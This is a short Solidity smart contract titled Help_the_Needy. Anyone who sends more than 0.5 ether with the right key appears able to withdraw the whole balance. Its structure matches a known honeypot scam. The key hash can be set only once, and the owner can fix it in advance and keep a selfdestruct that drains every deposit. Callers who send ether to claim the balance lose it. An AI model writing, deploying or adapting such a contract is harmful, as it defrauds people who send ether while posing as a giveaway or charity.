1 pragma solidity ^0.4.25;
2 
3 /**
4  * By sending ether to this contract, you agree to our privacy policy:
5  *   http://www.htntc.org/privacy-policy/
6  *
7  */
8 
9 contract Help_the_Needy
10 {
11     bytes32 keyHash;
12     address owner;
13 
14     constructor() public {
15         owner = msg.sender;
16     }
17 
18     function withdraw(string key) public payable
19     {
20         require(msg.sender == tx.origin);
21         if(keyHash == keccak256(abi.encodePacked(key))) {
22             if(msg.value > 0.5 ether) {
23                 msg.sender.transfer(address(this).balance);
24             }
25         }
26     }
27 
28     function setup(string key) public
29     {
30         if (keyHash == 0x0) {
31             keyHash = keccak256(abi.encodePacked(key));
32         }
33     }
34 
35     function new_hash(bytes32 _keyHash) public
36     {
37         if (keyHash == 0x0) {
38             keyHash = _keyHash;
39         }
40     }
41 
42     function extract() public
43     {
44         require(msg.sender == owner);
45         selfdestruct(owner);
46     }
47 
48     function get_owner() public view returns(address){
49         return owner;
50     }
51 
52     function () public payable {
53     }
54 }